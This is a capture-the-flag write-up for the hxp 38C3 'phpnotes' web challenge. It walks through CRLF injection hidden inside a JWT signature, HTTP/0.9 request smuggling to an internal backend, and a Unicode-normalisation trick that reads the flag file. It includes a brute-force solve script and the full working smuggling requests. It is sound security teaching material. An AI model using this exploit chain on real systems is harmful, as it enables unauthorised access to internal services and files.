# phpnotes

<details><summary><strong>Table of Contents</strong></summary>

- [Overview](#overview)
- [Background](#background)
- [Enumeration](#enumeration)
    - [Service `frontend` to `auth`](#service-frontend-to-auth)
    - [Service `frontend` to `backend`](#service-frontend-to-backend)
    - [CRLF Injection in JWT Signature](#crlf-injection-in-jwt-signature)
- [Exploitation](#exploitation)
- [Conclusion](#conclusion)

</details>

## Overview

- Contributor: @siunam, @ozetta
- 7 solves / 625 points
- Author: @hlt
- Overall difficulty for me (From 1-10 stars): ★★★★★★★★☆☆

## Background

You may think [you’ve seen this before](https://github.com/ECSC2024/openECSC-2024/tree/main/round-2/web03), but you haven’t.

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231194903.png)

## Enumeration

Index page:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231141842.png)

Looks like we need to register a new account and login first.

Let's do that!

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142001.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142011.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142042.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142051.png)

After logging in, we can create a note:

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142203.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/images/Pasted%20image%2020241231142221.png)

After creating a new note, we'll be redirected to `/note.php?id=<note_id>`.

Hmm... Let's read this web application's source code!

**In this challenge, we can download a [file](https://github.com/siunam321/CTF-Writeups/blob/main/hxp-38C3-CTF/Web/phpnotes/phpnotes-ec604b5d03f9d522.tar.xz):**
```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/phpnotes)-[2024.12.31|14:23:52(HKT)]
└> file phpnotes-ec604b5d03f9d522.tar.xz 
phpnotes-ec604b5d03f9d522.tar.xz: XZ compressed data, checksum CRC64
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/phpnotes)-[2024.12.31|14:23:53(HKT)]
└> tar xvf phpnotes-ec604b5d03f9d522.tar.xz                        
phpnotes/
phpnotes/frontend/
phpnotes/frontend/Dockerfile
[...]
phpnotes/auth/docker-stuff/default
phpnotes/auth/app.py
```

After reading it a bit, we can have the following findings:
1. This web application has 3 services: `frontend`, `auth`, and `backend`. The `frontend` is written in PHP, `auth` and `backend` are written in Python with web application framework [Flask](https://flask.palletsprojects.com/en/stable/)
2. Only service `frontend` is exposed

First off, what is our objective in this challenge? Where's the flag?

In service `backend`, we can see that the flag file is in path `/var/www/app/flag`:

`backend/Dockerfile`:

```bash
[...]
COPY flag /var/www/app/
```

Then, in `backend/app.py`, **GET route `/<note>` can read arbitrary files** based on the value of `note`:

```python
from flask import Flask, jsonify, request
from json import dumps, loads
from pathlib import Path
[...]
from werkzeug.utils import secure_filename
[...]
app = Flask(__name__)
[...]
@app.route('/<note>', methods=['GET'])
def get(note: str):
    path = Path(secure_filename(note))

    try:
        raw_data = path.read_text()
    except:
        return jsonify({'success': False, 'error': f'no such note: {note}'})

    try:
        data = loads(raw_data)
    except:
        return jsonify({'success': False, 'error': f'malformed note json: {raw_data}'})

    title = data.get('title')
    content = data.get('content')
    if not title or not content:
        return jsonify({'success': False, 'error': f'malformed note json: {raw_data}'})

    return jsonify({'success': True, 'note': {'title': title, 'content': content}})
```

In this route, if `note` is `flag`, the `path` will be `/var/www/html/flag`. This is because this `backend/app.py` is in `/var/www/html/`, so the current working directory is `/var/www/html/`. Then, since the flag file is not a valid JSON syntax, `loads` function will throw an exception, which returns a JSON object that contains the content of the flag file:

```python
@app.route('/<note>', methods=['GET'])
def get(note: str):
    path = Path(secure_filename(note))

    try:
        raw_data = path.read_text()
    except:
        return jsonify({'success': False, 'error': f'no such note: {note}'})

    try:
        data = loads(raw_data)
    except:
        return jsonify({'success': False, 'error': f'malformed note json: {raw_data}'})
    [...]
```

So, our goal is to somehow **send a GET request `/flag` to the `backend` service**.

Hmm... How does the `frontend` service sends requests to the `auth` and `backend` service?

### Service `frontend` to `auth`

In `frontend/src/login.php`, we can see the following PHP code:

```php
require_once 'lib/backend.php';
[...]
if (isset($_POST['username']) && isset($_POST['password'])) {
    try {
        $token = Auth::instance()->login($_POST['username'], $_POST['password']);
        setcookie('auth', $token, [
            'samesite' => 'Strict',
            'httponly' => true,
        ]);
        header('Location: /');
        exit();
    } catch (AuthException | BackendException $e) {
        [...]
    }
}
```

When we provide a POST parameter `username` and `password`, it'll call static method `instance` and method `login` from class `Auth`, which returns a token. Finally, it'll set a new cookie called `auth` with the value of the token.

Let's dive deeper into the `Auth` class in `frontend/src/lib/backend.php`!

When static method `instance` is called, it'll get the instance of the object. If it doesn't exist, it'll create a new one:

```php
class Auth {
    [...]
    private function __construct() {
        $this->server = new Server(getenv("AUTH"), false);
        $this->auth_key = $this->server->get('/public-key', json: false);
    }

    public static function instance(): self {
        if (self::$singleton === null)
            self::$singleton = new Auth();
        return self::$singleton;
    }
    [...]
}
```

In the `__construct` magic method, it'll create a new `Server` object and send a GET request to endpoint `/public-key` to the `auth` service:

```php
class Server {
    [...]
    public function __construct(string $url, bool $keepalive, float $timeout = 0.5) {
        $this->url = $url;
        $this->keepalive = $keepalive;
        $this->timeout = $timeout;
    }
    [...]
}
```

```php
class Server {
    [...]
    /** @param array<string> $headers */
    public function get(string $path, array $headers = [], bool $json = true): mixed {
        return self::request($this->build_context('GET', $headers, null), $this->url . $path, $json);
    }
    [...]
}
```

We will take a closer look to class `Server` method `request` and `build_context` later. Let's move on.

In class `Auth` method `login`, it'll send a POST request to endpoint `/login` to the `auth` service:

```php
class Auth {
    [...]
    public function login(string $username, string $password): string {
        $response = $this->server->post('/login', [
            'username' => $username,
            'password' => $password
        ]);
        if (!$response->success)
            throw new AuthException($response->error);
        else
            return $response->token;
    }
    [...]
}
```

```php
class Server {
    [...]
    /** @param array<string> $headers */
    public function post(string $path, mixed $body, array $headers = [], bool $json = true): mixed {
        return self::request($this->build_context('POST', $headers, json_encode($body)), $this->url . $path, $json);
    }
}
```

Huh, what is that token? In the `auth` service POST route `/login`, we can see that the token is **JSON Web Token (JWT)**, and the signing algorithm is RS256 (RSA + SHA256):

```python
from jwt import encode
from pathlib import Path
[...]
private_key_bytes = Path('/jwt.pem').read_bytes()
[...]
@app.route('/login', methods=['POST'])
def login():
    [...]
    db = get_db()
    cursor = db.execute('SELECT username FROM users WHERE username = ? AND password = ?', (username, password))
    row = cursor.fetchone()
    [...]
    username = row['username']

    now = datetime.now(UTC)
    token = encode(
        {
            'username': username,
            'iat': now,
            'exp': now + timedelta(hours=1),
        },
        private_key_bytes,
        algorithm='RS256'
    )
    return jsonify({'success': True, 'token': token})
```

### Service `frontend` to `backend`

In `frontend/src/note.php`, we can see the following PHP code:

```php
require_once 'lib/backend.php';

try {
    $api = new Backend($_COOKIE['auth'] ?? '');
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        [...]
    } else if (isset($_GET['id'])) {
        [...]
    } else {
        header('Location: /index.php');
        exit();
    }
} catch (AuthException $e) {
    header('Location: /login.php');
    exit();
} catch (BackendException | NetworkException $e) {
    http_response_code(503);
    echo $e->getMessage();
    exit();
}
```

It first creates a new `Backend` object and it parses our `auth` cookie:

```php
class Backend {
    [...]
    public function __construct(mixed $token) {
        if ($token == null || !is_string($token))
            throw new AuthException('You are not logged in');
        $this->server = new Server(getenv("BACKEND"), true);
        $this->auth = ["Authorization: Bearer " . $token];
        $this->user = Auth::instance()->username($token);
    }
    [...]
}
```

Same as the `Auth` class initialization, it creates a new `Server` object instance. It also assign property `auth` with an array. In that array's item, it looks like it's the `Authorization` request header, and **it directly concatenates our `auth` cookie to the header's value**. Interesting... Maybe we can leverage **CRLF (Carriage Return (`\r`) Line Feed (`\n`)) injection**?

In the `user` property, it calls method `username` from class `Auth`:

```php
use Firebase\JWT\JWT;
[...]
class Auth {
    [...]
    // JWT decoding
    private function decode(string $token): mixed {
        try {
            $data = JWT::decode($token, new Key($this->auth_key, 'RS256'));
        } catch (UnexpectedValueException $e) {
            throw new AuthException('Invalid JWT token');
        }
        return $data;
    }

    public function username(string $token): ?string {
        return $this->decode($token)->username;
    }
    [...]
}
```

This method is basically using [Firebase's PHP-JWT](https://github.com/firebase/php-jwt) library to verify our JWT and get the payload claim `username`.

> Note: In Firebase's PHP-JWT library, the `decode` method means verifying the JWT and decoding it. The library doesn't provide a way to directly decode the JWT for very obvious security reasons.

After creating the `Backend` object, if we provide GET parameter `id`, it'll call method `get` from class `Backend`:

```php
try {
    $api = new Backend($_COOKIE['auth'] ?? '');
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        [...]
    } else if (isset($_GET['id'])) {
        $id = $_GET['id'];
        $data = $api->get($id);
        $title = $data->title;
        $content = $data->content;
    } else {
        [...]
    }
} catch (AuthException $e) {
    [...]
} catch (BackendException | NetworkException $e) {
    [...]
}
```

Which sends a GET request to endpoint `/<note>` to the `backend` service:

```php
class Backend {
    [...]
    // API calls
    public function get(string $note): stdClass {
        if (!Backend::check($note))
            throw new BackendException('Invalid note ID');
        $response = $this->server->get("/$note", $this->auth);
        if (!$response->success)
            throw new BackendException($response->error);
        return $response->note;
    }
    [...]
}
```

However, before it does that, it calls static method `check` to validate our note ID:

```php
class Backend {
    [...]
    public static function check(string $id): bool {
        return preg_match('/^[0-9a-f]{32}$/', $id) === 1;
    }
    [...]
}
```

In this method, it **validates our note ID must be 32 hexadecimals**.

Hmm... So we can't read the flag file via `/flag` in the `frontend` service?

After validating our note ID, it'll call method `get` from class `Server`. If the response has error, it throws `BackendException` with the error message:

```php
class Backend {
    [...]
    // API calls
    public function get(string $note): stdClass {
        [...]
        $response = $this->server->get("/$note", $this->auth);
        if (!$response->success)
            throw new BackendException($response->error);
        return $response->note;
    }
    [...]
}
```

Do you still remember what happens if the `backend` service GET route `/<note>` tries to serialize an invalid JSON object?

```python
@app.route('/<note>', methods=['GET'])
def get(note: str):
    [...]
    try:
        data = loads(raw_data)
    except:
        return jsonify({'success': False, 'error': f'malformed note json: {raw_data}'})
```

So, assume we somehow let the `backend` to read the flag file, what would happen in the `frontend`?

Fortunately, `frontend/src/note.php` will **catch the `BackendException` and outputs the exception message**:

```php
try {
    $api = new Backend($_COOKIE['auth'] ?? '');
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        [...]
    } else if (isset($_GET['id'])) {
        $id = $_GET['id'];
        $data = $api->get($id);
        $title = $data->title;
        $content = $data->content;
    } else {
        [...]
    }
} catch (AuthException $e) {
    [...]
} catch (BackendException | NetworkException $e) {
    http_response_code(503);
    echo $e->getMessage();
    exit();
}
```

With that said, if we can somehow **send a GET request to `/flag` to the `backend` service, we can read the flag in the `frontend` service**! But how? The regex for the note ID seems impossible to bypass.

### CRLF Injection in JWT Signature

In class `Backend` method `get`, it'll parse path `/<note>` and the `Authorization` request header to class `Server` method `get`:

```php
class Backend {
    [...]
    public function get(string $note): stdClass {
        [...]
        $response = $this->server->get("/$note", $this->auth);
        [...]
    }
    [...]
}
```

Now, since **our JWT is directly appended to the `Authorization` request header's value**, maybe we can **smuggle a request to the `backend` via CRLF injection**?

Let's take a closer look to the class `Server` method `get`:

```php
class Server {
    [...]
    /** @param array<string> $headers */
    public function get(string $path, array $headers = [], bool $json = true): mixed {
        return self::request($this->build_context('GET', $headers, null), $this->url . $path, $json);
    }
    [...]
}
```

First, it calls method `build_context` to create a HTTP context using PHP function `stream_context_create`:

```php
class Server {
    [...]
    /** @param array<string> $headers */
    private function build_context(string $method, array $headers = [], mixed $content = null): mixed {
        [...]
        $http = [
            'method' => $method,
            'header' => $headers,
            'timeout' => $this->timeout,
            'content' => $content,
            'ignore_errors' => true,
        ];
        return stream_context_create(['http' => $http]);
    }
    [...]
}
```

After that, it calls static method `request`, which sends the request based on the context via PHP function `file_get_contents`:

```php
class Server {
    [...]
    // Server requests
    private static function request(mixed $context, string $url, bool $json = true): mixed {
        $response = file_get_contents($url, false, $context);
        [...]
        try {
            $output = json_decode($response, flags: JSON_THROW_ON_ERROR);
        } catch (JsonException $e) {
            throw new NetworkException("Failed to decode response from $url: $response");
        }
        return $output;
    }
    [...]
}
```

Hmm... Can we do CRLF injection via PHP function `stream_context_create`? Let's test it locally via `docker compose up --build -d`!

> Note: Try to modify `frontend/Dockerfile`'s PHP composer installation with the following. Otherwise composer won't be installed due to the time to install it.
> ```bash
> RUN curl -sS https://getcomposer.org/installer | php -- --install-dir=/usr/local/bin --filename=composer && composer update
> ``` 

After logging in and creating a new note, we can send the following request to test the **CRLF injection to HTTP request smuggling**:

```http
GET /note.php?id=<note_id_here> HTTP/1.1
Host: localhost:4891
Cookie: auth=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNpdW5hbSIsImlhdCI6MTczNTYzMzE1NCwiZXhwIjoxNzM1NjM2NzU0fQ.Dfa8LvzQclcK3C-bUOPt5UdGwYBP5TlXWB5B4tYqv0kTtbj6fPIt3uuQ_dpIklTSmEY7TNly2i-8U9fyUoJnDKS84Qv7Ps5e3Be9pjwwqxKbS5F6V-P9Ja39xDODmYP45gapHQ6v7nlt6krArvhSZLoXPHOICoJBfrJTGbTeii9G2OUIJrGDxZn4UhmUlMrdvA198ZxMROX9--SnoQIZz7DL7Hyapx2a95mWDvLqlYIkOG67_9MKCKOrshMS_ioXYbRRjb-gSyydje76x44yGabHZQTPtGUr_MW79tSJ-dWswMZ6Vatjj6UOZjpNsBQ4gWL7a9PL8tCwvi15t5ua_Q%0d%0a%0d%0a


```

Smuggled request:

```
[other_headers_here]


```

> Note: We need to URL encode the CR and LF characters. PHP will then URL decode them.

Response:

```http
HTTP/1.1 503 Service Unavailable
Server: nginx/1.22.1
Date: Tue, 31 Dec 2024 08:19:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Content-Length: 445

Failed to decode response from http://backend/e88869df3efe30ba5e0afb8bbad0a9be: {"note":{"content":"bar","title":"foo"},"success":true}
HTTP/1.1 400 Bad Request
Server: nginx/1.22.1
Date: Tue, 31 Dec 2024 08:19:45 GMT
Content-Type: text/html
Content-Length: 157
Connection: close

<html>
<head><title>400 Bad Request</title></head>
<body>
<center><h1>400 Bad Request</h1></center>
<hr><center>nginx/1.22.1</center>
</body>
</html>
```

As you can see, our CRLF injection caused HTTP status code "400 Bad Request". This is because our smuggled HTTP request is not invalid according to the [HTTP specification](https://datatracker.ietf.org/doc/html/rfc2616#autoid-37).

Now, what if we try to make it as a valid HTTP request?

```http
GET /note.php?id=<note_id_here> HTTP/1.1
Host: localhost:4891
Cookie: auth=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InNpdW5hbSIsImlhdCI6MTczNTYzMzE1NCwiZXhwIjoxNzM1NjM2NzU0fQ.Dfa8LvzQclcK3C-bUOPt5UdGwYBP5TlXWB5B4tYqv0kTtbj6fPIt3uuQ_dpIklTSmEY7TNly2i-8U9fyUoJnDKS84Qv7Ps5e3Be9pjwwqxKbS5F6V-P9Ja39xDODmYP45gapHQ6v7nlt6krArvhSZLoXPHOICoJBfrJTGbTeii9G2OUIJrGDxZn4UhmUlMrdvA198ZxMROX9--SnoQIZz7DL7Hyapx2a95mWDvLqlYIkOG67_9MKCKOrshMS_ioXYbRRjb-gSyydje76x44yGabHZQTPtGUr_MW79tSJ-dWswMZ6Vatjj6UOZjpNsBQ4gWL7a9PL8tCwvi15t5ua_Q%0d%0a%0d%0aGET /flag HTTP/1.1%0d%0a


```

Smuggled request:

```http
GET /flag HTTP/1.1
Host: backend


```

Response:

```http
HTTP/1.1 302 Found
[...]
Location: /login.php
Content-Length: 0
```

Wait, it didn't get smuggled to the `backend` service?

Oh wait, **this JWT is now invalid**...

With that said, we need to somehow **smuggle an HTTP request to the `backend` service in the JWT's signature**.

If we take a closer look at [the `decode` method in library PHP-JWT](https://github.com/firebase/php-jwt/blob/main/src/JWT.php#L96-L161), the signature is decoded via [static method `urlsafeB64Decode`](https://github.com/firebase/php-jwt/blob/main/src/JWT.php#L411-L414):

```php
public static function decode(
        string $jwt,
        $keyOrKeyArray,
        ?stdClass &$headers = null
    ): stdClass {
    $tks = \explode('.', $jwt);
    [...]
    list($headb64, $bodyb64, $cryptob64) = $tks;
    [...]
    $sig = static::urlsafeB64Decode($cryptob64);
    [...]
```

As the method name suggested, it performs URL-safe base64 decoding:

```php
public static function urlsafeB64Decode(string $input): string
{
    return \base64_decode(self::convertBase64UrlToBase64($input));
}
```

In that method, it also calls static method `convertBase64UrlToBase64` to convert the base64 encoded string to a URL-safe one:

```php
public static function convertBase64UrlToBase64(string $input): string
{
    $remainder = \strlen($input) % 4;
    if ($remainder) {
        $padlen = 4 - $remainder;
        $input .= \str_repeat('=', $padlen);
    }
    return \strtr($input, '-_', '+/');
}
```

Which add padding `=` character(s) if the input is not multiply of 4, and **replace** `+` with `-`, **`_` with `/`**.

After converting, it calls [PHP function `base64_decode`](https://www.php.net/manual/en/function.base64-decode.php) to decode the signature.

Hmm... Does that means **our CRLF injection payload must be within the base64 alphabet??**

Well, not all of them.

According to [PHP's documentation about function `base64_decode`](https://www.php.net/manual/en/function.base64-decode.php), if parameter `$strict` is `false` (By default it's `false`), **when the input contains character from outside the base64 alphabet, invalid characters will be silently discarded.**

Ah ha! No wonder why we can inject CR and LF characters. Not only those, but also characters like `:`, and more.

With that being said, we need to generate a JWT that contains something like `GET_flagHTTP11`? (We can replace the `_` character with `/`, which will be replaced with `/` by library PHP-JWT)

If we generated something like that, we can then add the characters that are outside the base64 alphabet, like this:

```
<CR><LF><CR><LF>GET _flag HTTP/1.1
```

```http


GET _flag HTTP/1.1
```

Hmm... Wait, what are the odds to generate that string... Extremely unlikely I guess. Can we **reduce the required characters** in order to achieve the request smuggling?

After some research, we know that the first HTTP version is **[HTTP/0.9](https://http.dev/0.9)**. In that version, the request format is like this:

```http
GET /index.html
```

As you can see, we don't need to provide the HTTP version in here. Therefore, **if we can use HTTP version HTTP/0.9**, we can reduce 6 required characters to smuggle.

In the `backend` service, the HTTP server is **[Nginx](https://nginx.org/)**. Let's see if it supports HTTP/0.9!

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/phpnotes)-[2024.12.31|17:25:57(HKT)]
└> nc 172.18.0.4 80 
GET /flag
{"error":"malformed note json: hxp{dummy}","success":false}
```

> Note: `172.18.0.4` is the `backend` service IP address. It might be different in your case.

Oh! **It does support HTTP/0.9**. Nice!

Now, can we even go further? Like reducing the word `flag`.

In the `backend` service route `/<note>`, we can see that our `note` is parsed to function `secure_filename` from `werkzeug.utils`:

```python
from werkzeug.utils import secure_filename
[...]
@app.route('/<note>', methods=['GET'])
def get(note: str):
    path = Path(secure_filename(note))
```

If we read [the source code of function `secure_filename`](https://github.com/pallets/werkzeug/blob/main/src/werkzeug/utils.py#L195-L239), it'll actually perform **[NFKD (Normalization Form KD) Unicode normalization](https://unicode.org/reports/tr15/) using [module `unicodedata` function `normalize`](https://docs.python.org/3/library/unicodedata.html#unicodedata.normalize)**:

```python
import unicodedata
[...]
def secure_filename(filename: str) -> str:
    [...]
    filename = unicodedata.normalize("NFKD", filename)
    [...]
```

Hence, we can Google "unicode normalization table" ([https://www.unicode.org/charts/normalization/](https://www.unicode.org/charts/normalization/)) to test it out. After searching different unicode, we can test this `𝗳𝗅𝒶𝑔`:

```
root@cd011d4aa8d0:/# python3
[...]
>>> from werkzeug.utils import secure_filename
>>> print(secure_filename('𝗳𝗅𝒶𝑔'))
flag
```

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/phpnotes)-[2024.12.31|17:33:47(HKT)]
└> nc 172.18.0.4 80               
GET /𝗳𝗅𝒶𝑔
{"error":"malformed note json: hxp{dummy}","success":false}
```

Nice! We can now **reduce 4 required characters to smuggle**!

## Exploitation

To sum up, we need to **generate a JWT that contains the string `GET_` in the signature**, which is doable.

To generate the JWT more efficiently, the JWT is signed via PHP function `openssl_sign` when algorithm `RS256` is used. After some testing, it seems like the signature only changes based on the username and the second-granular UNIX timestamp of issue (`iat`) and expiry (`exp`).

> [...]the signature process itself is deterministic for a given message, and the message only changes based on the username and the second-granular UNIX timestamp of issue (`iat`) and expiry (`exp`). If you attempt to obtain signatures by logging in the same user over and over again, you will receive lots of duplicates, and spend a long time searching. - [https://hxp.io/blog/113/hxp-38C3-CTF-phpnotes/](https://hxp.io/blog/113/hxp-38C3-CTF-phpnotes/)

With that said, we need to **register a bunch of users and login to them**, so that we won't get any duplicates.

To get the JWT that contains `GET_` in the signature, I have written the following Python script:

<details><summary><strong>solve.py</strong></summary>

```python
#!/usr/bin/env python3
import requests
import random
import multiprocessing
import re
from string import ascii_letters, digits
from multiprocessing.pool import ThreadPool

class Solver:
    def __init__(self, baseUrl, threadPoolSize=10):
        self.baseUrl = baseUrl
        self.threadPoolSize = threadPoolSize
        self.threadPool = ThreadPool(processes=self.threadPoolSize)
        self.session = requests.Session()
        self.usernames = list()
        self.PASSWORD = 'anything'
        self.REGISTER_ENDPOINT = f'{self.baseUrl}/register.php'
        self.LOGIN_ENDPOINT = f'{self.baseUrl}/login.php'
        self.NOTE_ENDPOINT = f'{self.baseUrl}/note.php'
        self.CRLF_INJECTION_REGEX = re.compile('GET\_')
    
    def generateRandomUsername(self, length=10):
        return ''.join(random.choices(ascii_letters + digits, k=length))

    def register(self, numberOfUsers):
        for _ in range(numberOfUsers):
            username = self.generateRandomUsername()
            self.usernames.append(username)
            
            data = {
                'username': username,
                'password': self.PASSWORD
            }
            requests.post(self.REGISTER_ENDPOINT, data=data)

    def login(self, username):
        data = {
            'username': username,
            'password': self.PASSWORD
        }
        cookie = requests.post(self.LOGIN_ENDPOINT, data=data).request.headers['Cookie']
        return cookie.split('=')[1]

    def findCorrectSignature(self, username):
        self.login(username)
        jwt = self.login(username)
        signature = jwt.split('.')[-1]
        
        if not self.CRLF_INJECTION_REGEX.search(signature):
            return None

        print(f'[+] We found a JWT that contains "GET_" in the signature: {jwt}')
        return jwt
        
    def findCorrectSignatureWorker(self):
        for username in self.usernames:
            result = self.threadPool.apply_async(self.findCorrectSignature, (username,))
            jwt = result.get()
            if jwt == None:
                continue

            return jwt

    def solve(self):
        self.register(self.threadPoolSize)
        
        while True:
            jwt = self.findCorrectSignatureWorker()
            if not jwt:
                continue

            # print(f'[+] Process {multiprocessing.current_process().name} found JWT: {jwt}')
            return jwt

    @staticmethod
    def processWorker(baseUrl, threadPoolSize):
        solver = Solver(baseUrl, threadPoolSize)
        return solver.solve()

if __name__ == '__main__':
    baseUrl = 'http://localhost:4891' # for local testing
    # baseUrl = 'http://10.244.0.1/'
    threadPoolSize = 50
    
    numberOfCpuCores = multiprocessing.cpu_count()
    print(f'[*] Starting {numberOfCpuCores} processes...')
    
    with multiprocessing.Pool(processes=numberOfCpuCores) as pool:
        processes = list()
        for _ in range(numberOfCpuCores):
            processes.append(pool.apply_async(Solver.processWorker, (baseUrl, threadPoolSize)))
        
        for process in processes:
            try:
                result = process.get()
                if result:
                    pool.terminate()
                    exit(0)
            except KeyboardInterrupt:
                pool.terminate()
                exit(1)
```

</details>

```shell
┌[siunam♥Mercury]-(~/ctf/hxp-38C3-CTF/Web/phpnotes)-[2024.12.31|18:01:28(HKT)]
└> python3 solve.py
[*] Starting 16 processes...
[+] We found a JWT that contains "GET_" in the signature: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImM1ekJPS0FEUzEiLCJpYXQiOjE3MzU2NDQxMzYsImV4cCI6MTczNTY0NzczNn0.2Wv_niEfIYFkd9K7Xr6OEE3GZ4aaXDq6I4d5OrDckYdlHjYPqPzy77POKbAcqKRRZMRQFUnnjsYQ2GRR2X--lqxxDaqSLWkB9lqrg89irJ3roTKVb3JiGCsazn9WbOFP4tnVtTYqyd74HYaeusEITl8jhSxUta4xhIfMA4YF9q_mVbvCMpIpjRaIXlj6uYVfeSW5HQ3NVRifpbkL1wGrQtPZGET_TLbW8otGzBbWsEfYS6iahujRx8S3cuseAIwdFXIqTzkVMNbBTF5UfNXB3xnsm5oAGHIt48DJLUwnhgS8iDo_WDI-acXliHH3Y_ebn-yFhXRiUWaAolEXAMQvNw
```

> Note: This process could take a very long time. In my local testing environment, it took me around 1 hour.

After obtaining the correct JWT, we can send the following request to smuggle a request to get the flag file:

```http
GET /note.php?id=e88869df3efe30ba5e0afb8bbad0a9be HTTP/1.1
Host: localhost:4891
Cookie: auth=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImM1ekJPS0FEUzEiLCJpYXQiOjE3MzU2NDQxMzYsImV4cCI6MTczNTY0NzczNn0.2Wv_niEfIYFkd9K7Xr6OEE3GZ4aaXDq6I4d5OrDckYdlHjYPqPzy77POKbAcqKRRZMRQFUnnjsYQ2GRR2X--lqxxDaqSLWkB9lqrg89irJ3roTKVb3JiGCsazn9WbOFP4tnVtTYqyd74HYaeusEITl8jhSxUta4xhIfMA4YF9q_mVbvCMpIpjRaIXlj6uYVfeSW5HQ3NVRifpbkL1wGrQtPZ%0D%0A%0D%0AGET%20/%F0%9D%97%B3%F0%9D%97%85%F0%9D%92%B6%F0%9D%91%94%0D%0A%0D%0ATLbW8otGzBbWsEfYS6iahujRx8S3cuseAIwdFXIqTzkVMNbBTF5UfNXB3xnsm5oAGHIt48DJLUwnhgS8iDo_WDI-acXliHH3Y_ebn-yFhXRiUWaAolEXAMQvNw


```

> Note: `%F0%9D%97%B3%F0%9D%97%85%F0%9D%92%B6%F0%9D%91%94` is the URL encoded `𝗳𝗅𝒶𝑔`.

CRLF injection payload:

```
<CR><LF><CR><LF>GET<space>/𝗳𝗅𝒶𝑔<CR><LF><CR><LF>
```

Smuggled request:

```http
GET /𝗳𝗅𝒶𝑔


```

Response:

```http
HTTP/1.1 503 Service Unavailable
[...]

Failed to decode response from http://backend/e6be69e6605cbe3c5f69de04bd7153cd: {"note":{"content":"bar","title":"foo"},"success":true}
{"error":"malformed note json: hxp{dummy}","success":false}
```

Nice! We finally got the flag!

## Conclusion

What we've learned:

1. CRLF injection in JWT signature to HTTP request smuggling